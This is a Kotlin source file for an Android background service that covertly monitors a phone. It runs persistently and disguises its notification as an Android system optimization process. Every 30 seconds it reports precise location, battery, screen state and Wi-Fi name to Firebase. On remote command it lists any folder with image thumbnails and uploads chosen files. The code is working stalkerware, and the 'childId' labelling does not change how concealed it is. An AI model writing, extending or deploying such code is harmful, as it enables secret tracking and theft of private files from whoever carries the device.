package com.assisten.gestion

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.location.Location
import android.media.ThumbnailUtils
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import java.io.ByteArrayOutputStream
import java.io.File

class MonitoringService : Service() {

    private val database = FirebaseDatabase.getInstance().reference
    private val storage = FirebaseStorage.getInstance().reference
    private lateinit var childId: String
    private val handler = Handler(Looper.getMainLooper())
    private val statusUpdater = object : Runnable {
        override fun run() {
            updateLiveStatus()
            handler.postDelayed(this, 30000) // Actualizar cada 30 segundos
        }
    }

    @SuppressLint("HardwareIds")
    override fun onCreate() {
        super.onCreate()
        childId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                1, 
                createNotification(), 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            )
        } else {
            startForeground(1, createNotification())
        }
        
        setupCommandListener()
        handler.post(statusUpdater)
    }

    private fun setupCommandListener() {
        database.child("commands").child(childId).addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val command = snapshot.child("type").getValue(String::class.java)
                val path = snapshot.child("path").getValue(String::class.java).orEmpty()

                when (command) {
                    "GET_FILES" -> sendFilesList(path)
                    "UPLOAD_FILE" -> uploadFileToStorage(path)
                }
            }

            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun updateLiveStatus() {
        val batteryStatus: Intent? = IntentFilter(Intent.ACTION_BATTERY_CHANGED).let { ifilter ->
            applicationContext.registerReceiver(null, ifilter)
        }
        val level: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val batteryPct = if (scale > 0) level * 100 / scale.toFloat() else -1f
        
        val status: Int = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val isScreenOn = powerManager.isInteractive

        val wifiName = getWifiName(applicationContext)
        val model = "${Build.MANUFACTURER} ${Build.MODEL}"

        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
                .addOnSuccessListener { location: Location? ->
                    val locationStr = if (location != null) "${location.latitude},${location.longitude}" else "Desconocida"
                    
                    val statusMap = mapOf(
                        "battery" to batteryPct.toInt(),
                        "isCharging" to isCharging,
                        "isScreenOn" to isScreenOn,
                        "lastSeen" to System.currentTimeMillis(),
                        "wifiName" to wifiName,
                        "model" to model,
                        "location" to locationStr
                    )
                    database.child("status").child(childId).updateChildren(statusMap)
                }
        } else {
            val statusMap = mapOf(
                "battery" to batteryPct.toInt(),
                "isCharging" to isCharging,
                "isScreenOn" to isScreenOn,
                "lastSeen" to System.currentTimeMillis(),
                "wifiName" to wifiName,
                "model" to model,
                "location" to "Sin permiso"
            )
            database.child("status").child(childId).updateChildren(statusMap)
        }
    }

    @Suppress("DEPRECATION")
    private fun getWifiName(context: Context): String {
        return try {
            val manager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = manager.connectionInfo
            if (info != null && info.ssid != "<unknown ssid>") {
                info.ssid.replace("\"", "")
            } else {
                val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = cm.activeNetwork
                val capabilities = cm.getNetworkCapabilities(network)
                if (capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true) {
                    "WiFi Conectado"
                } else if (capabilities?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true) {
                    "Datos Móviles"
                } else {
                    "Sin Internet"
                }
            }
        } catch (e: Exception) {
            "Desconocida"
        }
    }

    private fun sendFilesList(path: String) {
        val targetPath = path.ifBlank { Environment.getExternalStorageDirectory().absolutePath }
        val directory = File(targetPath)
        val files = directory.listFiles() ?: emptyArray()
        
        val fileList = files.map { file ->
            val thumbnail = if (!file.isDirectory && isImageFile(file.name)) {
                generateThumbnailBase64(file)
            } else null

            mapOf(
                "name" to file.name,
                "isDirectory" to file.isDirectory,
                "path" to file.absolutePath,
                "thumbnail" to thumbnail
            )
        }
        database.child("responses").child(childId).setValue(fileList)
    }

    private fun isImageFile(fileName: String): Boolean {
        val lower = fileName.lowercase()
        return lower.endsWith(".jpg") || lower.endsWith(".jpeg") || lower.endsWith(".png") || lower.endsWith(".webp")
    }

    private fun generateThumbnailBase64(file: File): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ThumbnailUtils.createImageThumbnail(file, android.util.Size(100, 100), null)
            } else {
                ThumbnailUtils.extractThumbnail(BitmapFactory.decodeFile(file.absolutePath), 100, 100)
            }
            
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, outputStream)
            val byteArray = outputStream.toByteArray()
            Base64.encodeToString(byteArray, Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun uploadFileToStorage(path: String) {
        val file = File(path)
        if (!file.exists() || file.isDirectory) return

        val storageRef = storage.child("transfers/$childId/${file.name}")

        storageRef.putFile(Uri.fromFile(file)).addOnSuccessListener {
            storageRef.downloadUrl.addOnSuccessListener { url ->
                database.child("file_ready").child(childId).setValue(mapOf(
                    "name" to file.name,
                    "url" to url.toString(),
                    "status" to "success",
                    "timestamp" to System.currentTimeMillis()
                ))
            }
        }.addOnFailureListener { e ->
            database.child("file_ready").child(childId).setValue(mapOf(
                "name" to file.name,
                "status" to "error",
                "message" to e.message,
                "timestamp" to System.currentTimeMillis()
            ))
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(statusUpdater)
        val broadcastIntent = Intent(this, BootReceiver::class.java)
        sendBroadcast(broadcastIntent)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotification(): Notification {
        val channelId = "system_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId, "Sistema de Android", NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Procesos internos del sistema"
                setShowBadge(false)
            }
            val manager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Sistema de Android")
            .setContentText("Procesando servicios de optimización...")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(Notification.CATEGORY_SERVICE)
            .setSilent(true)
            .build()
    }
}
